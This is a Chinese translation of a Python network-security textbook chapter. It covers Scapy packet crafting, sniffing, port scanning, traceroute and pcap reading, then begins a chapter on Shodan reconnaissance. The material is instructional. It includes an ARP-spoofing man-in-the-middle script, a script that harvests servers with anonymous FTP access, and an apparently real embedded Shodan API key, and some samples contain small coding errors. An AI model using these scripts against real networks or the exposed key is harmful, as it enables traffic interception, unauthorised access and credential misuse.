Scapy 帮助我们在 TCP/IP 协议的任何一层中创建自定义数据包。在下面的示例中，我们在交互式 Scapy shell 中创建了 ICMP/IP 数据包。数据包是通过从物理层（以太网）开始的层创建的，直到达到数据层。

这是 Scapy 通过层管理的结构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8b6047ac-e6a8-4c20-ab8f-b688e9039617.png)

在 Scapy 中，一个层通常代表一个协议。网络协议以堆栈的形式结构化，每一步都由一个层或协议组成。网络包由多个层组成，每个层负责通信的一部分。

在 Scapy 中，数据包是一组结构化数据，准备好发送到网络。数据包必须遵循逻辑结构，根据您想要模拟的通信类型。如果要发送 TCP/IP 数据包，必须遵循 TCP/IP 标准中定义的协议规则。

默认情况下，`IP layer()`被配置为目标 IP 为 127.0.0.1，这指的是 Scapy 运行的本地机器。如果我们希望将数据包发送到另一个 IP 或域，我们将不得不配置 IP 层。

以下命令将在 IP 和 ICMP 层创建一个数据包：

```py
scapy>icmp=IP(dst='google.com')/ICMP()
```

此外，我们还可以在其他层创建数据包：

```py
scapy>tcp=IP(dst='google.com')/TCP(dport=80)
scapy>packet = Ether()/IP(dst="google.com")/ICMP()/"ABCD"
```

使用`show()`方法，我们可以查看特定数据包的详细信息。`show()`和`show2()`之间的区别在于，`show2()`函数显示的是数据包在网络上发送的样子：

```py
scapy> packet.show()
scapy> packet.show2()
```

我们可以看到特定数据包的结构：

```py
scapy> ls (packet)
```

Scapy 逐层创建和分析数据包。Scapy 中的数据包是 Python 字典，因此每个数据包都是一组嵌套的字典，每个层都是主层的子字典。**summary()**方法将提供每个数据包层的详细信息：

```py
>>> packet[0].summary()
```

有了这些功能，我们可以以更友好和简化的格式看到接收到的数据包：

```py
scapy> _.show()
scapy> _.summary()
```

# 使用 scapy 发送数据包

要发送 scapy 中的数据包，我们有两种方法：

+   **send():**发送第三层数据包

+   **sendp():**发送第二层数据包

如果我们从第三层或 IP 发送数据包并信任操作系统本身的路由来发送它，我们将使用`send()`。如果我们需要在第二层（例如以太网）进行控制，我们将使用`sendp()`。

发送命令的主要参数是：

+   **iface:**发送数据包的接口。

+   **Inter:**我们希望在发送数据包之间经过的时间，以秒为单位。

+   **loop:**设置为 1 以无限地发送数据包。如果不为 0，则以无限循环发送数据包，直到我们按下*Ctrl* + *C*停止。

+   **packet:**数据包或数据包列表。

+   **verbose:**允许我们更改日志级别，甚至完全停用（值为 0）。

现在我们使用 send 方法发送前面的数据包**第三层**：

```py
>> send(packet)
```

发送**第二层**数据包，我们必须添加一个以太网层，并提供正确的接口来发送数据包：

```py
>>> sendp(Ether()/IP(dst="packtpub.com")/ICMP()/"Layer 2 packet",iface="eth0")
```

使用`sendp()`函数，我们将数据包发送到相应的目的地：

```py
scapy> sendp(packet)
```

使用 inter 和 loop 选项，我们可以以循环的形式每 N 秒无限地发送数据包：

```py
scapy>sendp(packet, loop=1, inter=1)
```

`sendp (...)`函数的工作方式与`send (...)`完全相同，不同之处在于它在第二层中工作。这意味着不需要系统路由，信息将直接通过作为函数参数指示的网络适配器发送。即使通过任何系统路由似乎没有通信，信息也将被发送。

此函数还允许我们指定目标网络卡的物理或 MAC 地址。如果我们指定地址，scapy 将尝试自动解析本地和远程地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8229382d-c9e7-423e-a855-1fb4eadbb0e7.png)

`send`和`sendp`函数允许我们将所需的信息发送到网络，但不允许我们接收答案。

有许多方法可以接收我们生成的数据包的响应，但对于交互模式最有用的是`sr`函数系列（来自英文缩写：发送和接收）。

我们可以使用 Python 脚本执行相同的操作。首先，我们需要导入`scapy`模块。

您可以在`**scapy_icmp_google.py**`文件中找到以下代码：

```py
#!/usr/bin/python
import sys
from scapy.all import *

p=Ether()/IP(dst='www.google.com')/ICMP()
send(p)
```

用于发送和接收数据包的函数系列包括以下内容：

+   **sr (...):**发送并接收数据包，或数据包列表到网络。等待所有发送的数据包都收到响应。重要的是要注意，此函数在第三层中工作。换句话说，要知道如何发送数据包，请使用系统的路由。如果没有路由将数据包发送到所需的目的地，它将无法发送。

+   **sr1 (...)**：与`sr (...)`函数的工作方式相同，只是它只捕获收到的第一个响应，并忽略其他响应（如果有）。

+   **srp (...)**：它的操作与`sr (...)`函数相同，但在第 2 层。也就是说，它允许我们通过特定的网络卡发送信息。即使没有路由，信息也会被发送。

+   **srp1 (...):** 其操作与`sr1 (...)`函数相同，但在第 2 层。

+   **srbt (...)**：通过蓝牙连接发送信息。

+   **srloop (...)**：允许我们发送和接收信息`N`次。也就是说，我们可以告诉它发送一个包三次，因此，我们将按顺序接收三个包的响应。它还允许我们指定在接收到包时要采取的操作以及在没有收到响应时要采取的操作。

+   **srploop (...)**：与`srloop`相同，但在第 2 层工作。

如果我们想要发送和接收数据包，并有可能看到响应数据包，那么 srp1 函数可能会有用。

在下面的例子中，我们构建了一个 ICMP 数据包，并使用`sr1`发送：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d3c98aff-84ce-498f-a79d-550ff872e03b.png)

这个数据包是对 Google 的 TCP 连接的回应。

我们可以看到它有三层（以太网，IP 和 TCP）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/9e4cd29a-9d7d-4782-b8f2-c21fb5f1e509.png)

# 使用 scapy 进行数据包嗅探

大多数网络使用广播技术（查看信息），这意味着设备在网络上传输的每个数据包都可以被连接到网络的任何其他设备读取。

WiFi 网络和带有 HUB 设备的网络使用这种方法，但是路由器和交换机等智能设备只会将数据包路由并传递给其路由表中可用的机器。有关广播网络的更多信息可以在[`en.wikipedia.org/wiki/Broadcasting_(networking)`](https://en.wikipedia.org/wiki/Broadcasting_(networking))找到。

实际上，除了消息的接收者之外的所有计算机都会意识到消息不是为它们而设计的，并将其忽略。然而，许多计算机可以被编程为查看通过网络传输的每条消息。

scapy 提供的一个功能是嗅探通过接口传递的网络数据包。让我们创建一个简单的 Python 脚本来嗅探本地机器网络接口上的流量。

Scapy 提供了一种嗅探数据包并解析其内容的方法：

```py
sniff(filter="",iface="any",prn=function,count=N)
```

使用嗅探函数，我们可以像 tcpdump 或 Wireshark 等工具一样捕获数据包，指示我们要收集流量的网络接口以及一个计数器，指示我们要捕获的数据包数量：

```py
scapy> pkts = sniff (iface = "eth0", count = 3)
```

现在我们将详细介绍嗅探函数的每个参数。**sniff()**方法的参数如下：

+   **count**：要捕获的数据包数量，但 0 表示无限

+   **iface**：要嗅探的接口；仅在此接口上嗅探数据包

+   **prn**：要在每个数据包上运行的函数

+   **store**：是否存储或丢弃嗅探到的数据包；当我们只需要监视它们时设置为 0

+   **timeout**：在给定时间后停止嗅探；默认值为 none

+   **filter**：采用 BPF 语法过滤器来过滤嗅探

我们可以突出显示`prn`参数，该参数提供了要应用于每个数据包的函数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/412d3fa6-d502-4715-9680-bdc7a1dc9549.png)

这个参数将出现在许多其他函数中，并且正如文档中所述，它是指一个函数作为输入参数。

在`sniff()`函数的情况下，这个函数将被应用于每个捕获的数据包。这样，每当`sniff()`函数拦截一个数据包时，它将以拦截的数据包作为参数调用这个函数。

这个功能给了我们很大的力量，想象一下，我们想要构建一个拦截所有通信并存储网络中所有检测到的主机的脚本。使用这个功能将会非常简单：

```py
> packet=sniff(filter="tcp", iface="eth0", prn=lambda x:x.summary())
```

在下面的例子中，我们可以看到在 eth0 接口捕获数据包后执行`lambda`函数的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/6b4b64e9-85fd-4437-b4ef-3ad8a1fd5a7e.png)

在下面的例子中，我们使用`scapy`模块中的 sniff 方法。我们正在使用此方法来捕获`eth0`接口的数据包。在`print_packet`函数内，我们正在获取数据包的 IP 层。

您可以在**`sniff_main_thread.py`**文件中找到以下代码：

```py
from scapy.all import *
interface = "eth0"
def print_packet(packet):
    ip_layer = packet.getlayer(IP)
    print("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))

print("[*] Start sniffing...")
sniff(iface=interface, filter="ip", prn=print_packet)
print("[*] Stop sniffing")
```

在下面的例子中，我们使用`scapy`模块中的 sniff 方法。该方法的参数是您想要捕获数据包的接口，filter 参数用于指定要过滤的数据包。prn 参数指定要调用的函数，并将数据包作为参数发送到函数。在这种情况下，我们自定义的函数是`sniffPackets`。

在`sniffPackets`函数内，我们正在检查捕获的数据包是否具有 IP 层，如果有 IP 层，则我们存储捕获的数据包的源、目的地和 TTL 值，并将它们打印出来。

您可以在**`sniff_packets.py`**文件中找到以下代码：

```py
#import scapy module to python
from scapy.all import *

# custom custom packet sniffer action method
def sniffPackets(packet):
 if packet.haslayer(IP):
     pckt_src=packet[IP].src
     pckt_dst=packet[IP].dst
     pckt_ttl=packet[IP].ttl
     print "IP Packet: %s is going to %s and has ttl value %s" (pckt_src,pckt_dst,pckt_ttl)

def main():
 print "custom packet sniffer"
 #call scapy’s sniff method
 sniff(filter="ip",iface="wlan0",prn=sniffPackets)

 if __name__ == '__main__':
     main()
```

# 使用 scapy 的 Lambda 函数

`sniff`函数的另一个有趣特性是它具有“`prn`”属性，允许我们每次捕获数据包时执行一个函数。如果我们想要操作和重新注入数据包，这非常有用：

```py
scapy> packetsICMP = sniff(iface="eth0",filter="ICMP", prn=lambda x:x.summary())
```

例如，如果我们想要捕获 TCP 协议的 n 个数据包，我们可以使用 sniff 方法来实现：

```py
scapy> a = sniff(filter="TCP", count=n)
```

在此指令中，我们正在捕获 TCP 协议的 100 个数据包：

```py
scapy> a = sniff(filter="TCP", count=100)
```

在下面的例子中，我们看到了如何对捕获的数据包应用自定义操作。我们定义了一个`customAction`方法，该方法以数据包作为参数。对于`sniff`函数捕获的每个数据包，我们调用此方法并递增`packetCount`。

您可以在**`sniff_packets_customAction.py`**文件中找到以下代码：

```py
import scapy module
from scapy.all import *

## create a packet count var
packetCount = 0
## define our custom action function
def customAction(packet):
 packetCount += 1
 return "{} {} {}".format(packetCount, packet[0][1].src, packet[0][1].dst)
## setup sniff, filtering for IP traffic
sniff(filter="IP",prn=customAction)
```

此外，我们还可以使用`sniff`函数和**ARP 过滤**来监视 ARP 数据包。

您可以在**`sniff_packets_arp.py`**文件中找到以下代码：

```py
from scapy.all import *

def arpDisplay(pkt):
 if pkt[ARP].op == 1: #request
    x= "Request: {} is asking about {} ".format(pkt[ARP].psrc,pkt[ARP].pdst)
    print x
 if pkt[ARP].op == 2: #response
     x = "Response: {} has address {}".format(pkt[ARP].hwsrc,pkt[ARP].psrc)
     print x

sniff(prn=arpDisplay, filter="ARP", store=0, count=10)
```

# 过滤 UDP 数据包

在下面的例子中，我们看到了如何定义一个函数，每当进行**DNS 请求**时，都会执行该函数以获得 UDP 类型的数据包：

```py
scapy> a = sniff(filter="UDP and port 53",count=100,prn=count_dns_request)
```

可以通过命令行以这种方式定义此函数。首先，我们定义一个名为`DNS_QUERIES`的全局变量，当 scapy 发现使用 UDP 协议和端口 53 的数据包时，它将调用此函数来增加此变量，这表明通信中存在 DNS 请求：

```py
>>> DNS_QUERIES=0
>>> def count_dns_request(package):
>>>    global DNS_QUERIES
>>>    if DNSQR in package:
>>>        DNS_QUERIES +=1
```

# 使用 scapy 进行端口扫描和跟踪路由

在这一点上，我们将在某个网络段上看到一个端口扫描程序。与 nmap 一样，使用 scapy，我们也可以执行一个简单的端口扫描程序，告诉我们特定主机和端口列表是否打开或关闭。

# 使用 scapy 进行端口扫描

在下面的例子中，我们看到我们已经定义了一个`analyze_port()`函数，该函数的参数是要分析的主机和端口。

您可以在**`port_scan_scapy.py`**文件中找到以下代码：

```py
from scapy.all import sr1, IP, TCP

OPEN_PORTS = []

def analyze_port(host, port):
 """
 Function that determines the status of a port: Open / closed
 :param host: target
 :param port: port to test
 :type port: int
 """

 print "[ii] Scanning port %s" % port
 res = sr1(IP(dst=host)/TCP(dport=port), verbose=False, timeout=0.2)
 if res is not None and TCP in res:
     if res[TCP].flags == 18:
         OPEN_PORTS.append(port)
         print "Port %s open" % port

def main():
 for x in xrange(0, 80):
     analyze_port("domain", x)
 print "[*] Open ports:"
 for x in OPEN_PORTS:
     print " - %s/TCP" % x
```

# 使用 scapy 进行跟踪路由命令

跟踪路由是一种网络工具，可在 Linux 和 Windows 中使用，允许您跟踪数据包（IP 数据包）从计算机 A 到计算机 B 的路由。

默认情况下，数据包通过互联网发送，但数据包的路由可能会有所不同，如果链路故障或更改提供者连接的情况下。

一旦数据包被发送到接入提供商，数据包将被发送到中间路由器，将其传送到目的地。数据包在传输过程中可能会发生变化。如果中间节点或机器的数量太多，数据包的生存期到期，它也可能永远无法到达目的地。

在下面的例子中，我们将研究使用 scapy 进行跟踪路由的可能性。

使用 scapy，IP 和 UDP 数据包可以按以下方式构建：

```py
from scapy.all import *
ip_packet = IP(dst="google.com", ttl=10)
udp_packet = UDP(dport=40000)
full_packet = IP(dst="google.com", ttl=10) / UDP(dport=40000)
```

要发送数据包，使用`send`函数：

```py
send(full_packet)
```

IP 数据包包括一个属性（TTL），其中指示数据包的生存时间。因此，每当设备接收到 IP 数据包时，它会将 TTL（数据包生存时间）减少 1，并将其传递给下一个设备。基本上，这是一种确保数据包不会陷入无限循环的聪明方式。

要实现 traceroute，我们发送一个 TTL = i 的 UDP 数据包，其中 i = 1,2,3, n，并检查响应数据包，以查看我们是否已到达目的地，以及我们是否需要继续为我们到达的每个主机进行跳转。

您可以在**`traceroute_scapy.py`**文件中找到以下代码：

```py
from scapy.all import *
hostname = "google.com"
for i in range(1, 28):
    pkt = IP(dst=hostname, ttl=i) / UDP(dport=33434)
    # Send package and wait for an answer
    reply = sr1(pkt, verbose=0)
    if reply is None:
    # No reply
       break
    elif reply.type == 3:
    # the destination has been reached
        print "Done!", reply.src
        break
    else:
    # We’re in the middle communication
        print "%d hops away: " % i , reply.src
```

在下面的屏幕截图中，我们可以看到执行 traceroute 脚本的结果。我们的目标是 IP 地址 216.58.210.142，我们可以看到直到到达目标的跳数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7e8ec4d6-7168-408c-8928-3a733b319b68.png)

此外，我们还可以看到每一跳的所有机器，直到到达我们的目标：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/02dfb561-eff6-43b3-9ca4-d5b1730eb5c1.png)

# 使用 scapy 读取 pcap 文件

在本节中，您将学习读取 pcap 文件的基础知识。PCAP（数据包捕获）是指允许您捕获网络数据包以进行处理的 API。PCAP 格式是一种标准，几乎所有网络分析工具都使用它，如 TCPDump、WinDump、Wireshark、TShark 和 Ettercap。

# PCAP 格式简介

类似地，使用这种技术捕获的信息存储在扩展名为.pcap 的文件中。该文件包含帧和网络数据包，如果我们需要保存网络分析的结果以供以后处理，它非常有用。

如果我们需要保存网络分析的结果以供以后处理，或者作为工作成果的证据，这些文件非常有用。.pcap 文件中存储的信息可以被分析多次，而不会改变原始文件。

Scapy 包含两个用于处理 PCAP 文件的函数，它们允许我们对其进行读取和写入：

+   `rdcap()`**：**读取并加载.pcap 文件。

+   `wdcap()`**：**将一个包列表的内容写入.pcap 文件。

# 使用 scapy 读取 pcap 文件

使用`rdpcap()`函数，我们可以读取`pcap`文件并获得一个可以直接从 Python 处理的包列表：

```py
scapy> file=rdpcap('<path_file.pcap>')
scapy> file.summary()
scapy> file.sessions()
scapy> file.show()
```

# 编写一个 pcap 文件

使用`wrpcap()`函数，我们可以将捕获的数据包存储在 pcap 文件中。此外，还可以使用 Scapy 将数据包写入 pcap 文件。要将数据包写入 pcap 文件，我们可以使用`wrpcap()`方法。在下面的示例中，我们正在捕获 FTP 传输的 tcp 数据包，并将这些数据包保存在 pcap 文件中：

```py
scapy > packets = sniff(filter='tcp port 21')
 scapy> file=wrpcap('<path_file.pcap>',packets)
```

# 使用 scapy 从 pcap 文件中嗅探

使用`rdpcap()`函数，我们可以读取 pcap 文件并获得一个可以直接从 Python 处理的包列表：

```py
scapy> file=rdpcap('<path_file.pcap>')
```

我们还可以从读取 pcap 文件中进行类似的数据包捕获：

```py
scapy> pkts = sniff(offline="file.pcap")
```

Scapy 支持 B**PF（Beerkeley Packet Filters）**格式，这是一种应用于网络数据包的过滤器的标准格式。这些过滤器可以应用于一组特定的数据包，也可以直接应用于活动捕获：

```py
>>> sniff (filter = "ip and host 195.221.189.155", count = 2)
<Sniffed TCP: 2 UDP: 0 ICMP: 0 Other: 0>
```

我们可以格式化 sniff()的输出，使其适应我们想要查看的数据，并按我们想要的方式对其进行排序。我们将使用**“tcp and (port 443 or port 80)”**激活过滤器，并使用**prn = lamba x: x.sprintf**来捕获 HTTP 和 HTTPS 流量。我们想以以下方式显示以下数据：

+   源 IP 和原始端口

+   目标 IP 和目标端口

+   TCP 标志或标志

+   TCP 段的有效载荷

我们可以查看`sniff`函数的参数：

```py
sniff(filter="tcp and (port 443 or port 80)",prn=lambda x:x.sprintf("%.time% %-15s,IP.src% -> %-15s,IP.dst% %IP.chksum% %03xr, IP.proto% %r,TCP.flags%"))
```

在下面的示例中，我们可以看到在捕获数据包并应用过滤器后执行 sniff 函数的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a04b900f-9919-4596-a73b-d048281311c5.png)

协议输出现在不是 TCP、UDP 等，而是十六进制值：

**006 指的是 IP 协议字段**；它指的是数据部分中使用的下一级协议。长度为 8 位。在这种情况下，十六进制（06）（00000110）= TCP 在十进制中为 6。

2、16、18、24 等是 TCP 头部的标志，以十六进制格式表示。例如，18 在二进制中是 11000，正如我们已经知道的那样，这将激活 ACK + PSH。

# 使用 scapy 进行网络取证

Scapy 还可用于从 SQL 注入攻击中执行网络取证或从服务器提取 ftp 凭据。通过使用 Python scapy 库，我们可以确定攻击者何时/在哪里/如何执行 SQL 注入。借助 Python scapy 库的帮助，我们可以分析网络数据包的 pcap 文件。

使用 scapy，我们可以分析网络数据包并检测攻击者是否正在执行 SQL 注入。

我们将能够分析、拦截和解剖网络数据包，并重用它们的内容。我们有能力操作由我们捕获或生成的 PCAP 文件中的信息。

例如，我们可以开发一个简单的 ARP MITM 攻击脚本。

您可以在**`arp_attack_mitm.py` **文件中找到以下代码：

```py
from scapy.all import *
import time

op=1 # Op code 1 for query arp
victim="<victim_ip>" # replace with the victim's IP
spoof="<ip_gateway>" # replace with the IP of the gateway
mac="<attack_mac_address>" # replace with the attacker's MAC address

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while True:
 send(arp)
 time.sleep(2)
```

# 摘要

在本章中，我们研究了使用各种 Python 模块进行数据包构建和嗅探的基础知识，并且发现 scapy 非常强大且易于使用。到目前为止，我们已经学会了套接字编程和 scapy 的基础知识。在我们的安全评估中，我们可能需要原始输出和对数据包拓扑的基本级别访问，以便我们可以分析信息并自行做出决定。scapy 最吸引人的部分是可以导入并用于创建网络工具，而无需从头开始创建数据包。

在下一章中，我们将探讨使用 Python 编程包从具有 shodan 等服务的服务器中提取公共信息。

# 问题

1.  可以捕获数据包的 scapy 函数与 tcpdump 或 Wireshark 等工具的方式相同吗？

1.  用 scapy 无限制地每五秒发送一个数据包的最佳方法是什么？

1.  必须使用 scapy 调用的方法来检查某台机器（主机）上的某个端口（端口）是打开还是关闭，并显示有关发送的数据包的详细信息是什么？

1.  在 scapy 中实现 traceroute 命令需要哪些功能？

1.  哪个 Python 扩展模块与 libpcap 数据包捕获库进行接口？

1.  pcapy 接口中的哪个方法允许我们在特定设备上捕获数据包？

1.  在 Scapy 中发送数据包的方法是什么？

1.  sniff 函数的哪个参数允许我们定义一个将应用于每个捕获数据包的函数？

1.  scapy 支持哪种格式来对网络数据包应用过滤器？

1.  允许您跟踪数据包（IP 数据包）从计算机 A 到计算机 B 的路由的命令是什么？

# 进一步阅读

在这些链接中，您将找到有关提到的工具以及一些评论模块的官方 Python 文档的更多信息：

+   [`www.secdev.org/projects/scapy`](http://www.secdev.org/projects/scapy)

+   [`www.secdev.org/projects/scapy/build_your_own_tools.html`](http://www.secdev.org/projects/scapy/build_your_own_tools.html)

+   [`scapy.readthedocs.io/en/latest/usage.html`](http://scapy.readthedocs.io/en/latest/usage.html)

+   [`github.com/CoreSecurity/pcapy`](https://github.com/CoreSecurity/pcapy)

基于 scapy 的工具：

+   [`github.com/nottinghamprisateam/pyersinia`](https://github.com/nottinghamprisateam/pyersinia)

+   [`github.com/adon90/sneaky_arpspoofing`](https://github.com/adon90/sneaky_arpspoofing)

+   [`github.com/tetrillard/pynetdiscover`](https://github.com/tetrillard/pynetdiscover)

pyNetdiscover 是一种主动/被动地址侦察工具和 ARP 扫描仪，其要求是 python2.7 和`scapy`、`argparse`和`netaddr`模块。


# 第六章：从服务器中收集信息

在本章中，我们将研究主要模块，这些模块允许我们提取服务器以公开方式暴露的信息。通过我们讨论过的工具，我们可以获取可能对我们的渗透测试或审计过程的后续阶段有用的信息。我们将看到诸如 Shodan 和 Banner Grabbing 之类的工具，使用`DNSPython`模块获取 DNS 服务器的信息，以及使用`pywebfuzz`模块进行模糊处理。

本章将涵盖以下主题：

+   收集信息的介绍

+   `Shodan`包作为从服务器中提取信息的工具

+   `Shodan`包作为应用过滤器和在 Shodan 中搜索的工具

+   如何通过`socket`模块从服务器中提取横幅信息

+   `DNSPython`模块作为从 DNS 服务器中提取信息的工具

+   `pywebfuzz`模块作为获取特定服务器上可能存在的漏洞地址的工具

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter 6`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)。

您需要在本地计算机上安装 Python，并且需要一些关于 TCP 协议和请求的基本知识。

# 收集信息的介绍

收集信息的过程可以使用 Python 分发中默认安装的模块和简单安装的外部模块来自动化。我们将看到的一些模块允许我们提取服务器和服务的信息，例如域名和横幅。

有许多方法可以从服务器中收集信息：

+   我们可以使用 Shodan 从公共服务器中提取信息

+   我们可以使用`socket`模块从公共和私人服务器中提取横幅信息

+   我们可以使用`DNSPython`模块从 DNS 服务器中提取信息

+   我们可以使用`pywebfuzz`模块获取可能的漏洞

# 使用 Shodan 从服务器中提取信息

在本节中，您将学习使用 Shodan 从端口扫描、横幅服务器和操作系统版本中获取信息的基础知识。它不是索引网页内容，而是索引有关标头、横幅和操作系统版本的信息。

# Shodan 的介绍

Shodan 是 Sentient Hyper-Optimized Data Access Network 的缩写。与传统的搜索引擎不同，Shodan 尝试从端口中获取数据。免费版本提供 50 个结果。如果你知道如何创造性地使用它，你可以发现 Web 服务器的漏洞。

Shodan 是一个搜索引擎，可以让您从路由器、服务器和任何具有 IP 地址的设备中找到特定信息。我们可以从这项服务中提取的所有信息都是公开的。

Shodan 索引了大量的数据，这在搜索连接到互联网的特定设备时非常有帮助。我们可以从这项服务中提取的所有信息都是公开的。

使用 Shodan，我们还可以使用 REST API 进行搜索、扫描和查询：[`developer.shodan.io/api`](https://developer.shodan.io/api)。

# 访问 Shodan 服务

Shodan 是一个搜索引擎，负责跟踪互联网上的服务器和各种类型的设备（例如 IP 摄像头），并提取有关这些目标上运行的服务的有用信息。

与其他搜索引擎不同，Shodan 不搜索网页内容，而是从 HTTP 请求的标头中搜索有关服务器的信息，例如操作系统、横幅、服务器类型和版本。

Shodan 的工作方式与互联网上的搜索引擎非常相似，不同之处在于它不索引找到的服务器的内容，而是索引服务返回的标头和横幅。

它被称为“黑客的谷歌”，因为它允许我们通过应用不同类型的筛选器进行搜索，以恢复使用特定协议的服务器。

要从 Python 以编程方式使用 Shodan，需要在 Shodan 中拥有一个带有开发人员 Shodan 密钥的帐户，这样可以让 Python 开发人员通过其 API 自动化搜索其服务。如果我们注册为开发人员，我们会获得`SHODAN_API_KEY`，我们将在 Python 脚本中使用它来执行与[`developer.shodan.io`](https://developer.shodan.io)服务相同的搜索。如果我们注册为开发人员，除了能够获得`API_KEY`之外，我们还有其他优势，比如获得更多结果或使用搜索筛选器。

我们还有一些供开发人员使用的选项，可以让我们发现 Shodan 服务：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/64c53d0e-3b41-4761-a549-b76241dadd99.png)

要安装`Python`模块，可以运行`pip install shodan`命令。

Shodan 还有一个 REST API，可以向其服务发出请求，您可以在[`developer.shodan.io/api`](https://developer.shodan.io/api)找到。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/e0b54dc4-0fae-482c-aa4d-f7d9a68dd32d.png)

例如，如果我们想进行搜索，我们可以使用`/shodan/host/`端点搜索。为了正确地进行请求，需要指定我们注册时获得的`API_KEY`。

例如，通过这个请求，我们可以获得带有“apache”搜索的搜索结果，返回 JSON 格式的响应：[`api.shodan.io/shodan/host/search?key=<your_api_key>&query=apache`](https://api.shodan.io/shodan/host/search?key=v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik&query=apache)。

您可以在官方文档中找到更多信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/cce092a9-3099-4371-91b9-0d940c6855e0.png)

# Shodan 筛选器

Shodan 有一系列特殊的筛选器，可以让我们优化搜索结果。在这些筛选器中，我们可以突出显示：

+   **after/before**：按日期筛选结果

+   **country**：按两位国家代码筛选结果

+   **city**：通过城市筛选结果

+   **geo**：通过纬度/经度筛选结果

+   **hostname**：通过主机名或域名筛选结果

+   **net**：通过特定范围的 IP 或网络段筛选结果

+   **os**：执行特定操作系统的搜索

+   **port**：允许我们按端口号筛选

您可以在[`www.shodanhq.com/help/filters`](http://www.shodanhq.com/help/filters)找到更多关于 shodan 筛选器的信息。

# Shodan 搜索与 Python

通过 Python API 提供的`search`函数，可以以与 Web 界面相同的方式进行搜索。如果我们从 Python 解释器执行以下示例，我们会发现如果搜索“apache”字符串，我们会得到 15,684,960 个结果。

在这里，我们可以看到总结果和从解释器执行的`Shodan`模块：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1d719031-9e79-4c2e-94a7-5dc5972ab966.png)

我们还可以创建自己的类（**ShodanSearch**），该类具有`__init__`方法，用于初始化我们注册时获得的`API_KEY`的 Shodan 对象。我们还可以有一个方法，通过参数搜索搜索字符串，并调用 shodan 的 API 的搜索方法。

您可以在 github 存储库的 shodan 文件夹中的`ShodanSearch.py`文件中找到以下代码：

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import shodan
import re

class ShodanSearch:
    """ Class for search in Shodan """
    def __init__(self,API_KEY):
        self.api =  shodan.Shodan(API_KEY)    

    def search(self,search):
        """ Search from the search string"""
        try:
            result = self.api.search(str(search))
            return result
        except Exception as e:
            print 'Exception: %s' % e
            result = []
            return result
```

# 通过给定主机执行搜索

在这个例子中，从 Python 解释器执行，我们可以看到使用`shodan.host()`方法，可以获取特定 IP 的信息，比如国家、城市、服务提供商、服务器或版本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/64355c0a-012a-4927-abfc-6a9980492d62.png)

我们可以通过**数据数组**进行详细了解，其中可以获取更多关于**ISP**、**位置、纬度和经度**的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f89dfd7f-41eb-436a-af00-0cc0c66bf1c2.png)

在先前定义的`ShodanSearch`类中，我们可以定义一个方法，该方法通过主机的 IP 参数传递，并调用 shodan API 的`host()`方法：

```py
def get_host_info(self,IP):
""" Get the information that may have shodan on an IP""
    try:
        host = self.api.host(IP)
        return host
    except Exception as e:
        print 'Exception: %s' % e
        host = []
        return host
```

`ShodanSearch`脚本接受搜索字符串和主机的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/ddf0845c-4e96-4e66-a02d-7f13067e2c86.png)

在此示例执行中，我们正在测试 IP 地址 22.253.135.79，以获取此服务器的所有公共信息：

**`python .\ShodanSearch.py -h 23.253.135.79`**

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/c0ab91b6-103b-4a65-abb4-cf9c4c2194e1.png)

# 搜索 FTP 服务器

您可以搜索具有匿名用户的 FTP 访问权限并且可以在没有用户名和密码的情况下访问的服务器。

如果我们使用“**端口：21 匿名用户登录**”字符串进行搜索，我们将获得那些易受攻击的 FTP 服务器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/81811d2e-2261-434f-b97b-ab5d020a7767.png)

此脚本允许您获取允许匿名 FTP 访问的服务器中的 IP 地址列表。

您可以在`ShodanSearch_FTP_Vulnerable.py`文件中找到以下代码：

```py
import shodan
import re
sites =[]
shodanKeyString = 'v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik'
shodanApi = shodan.Shodan(shodanKeyString)
results = shodanApi.search("port: 21 Anonymous user logged in")
print "hosts number: " + str(len( results['matches']))
for match in results['matches']:
    if match['ip_str'] is not None:
        print match['ip_str']
        sites.append(match['ip_str'])
```

通过执行上述脚本，我们获得了一个 IP 地址列表，其中包含容易受到匿名登录 FTP 服务的服务器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/fa6007ba-a01f-4818-ac2a-5b62be918960.png)

# 使用 Python 获取服务器信息

在本节中，您将学习使用套接字和`python-whois`模块从服务器获取横幅和 whois 信息的基础知识。

# 使用 Python 提取服务器横幅

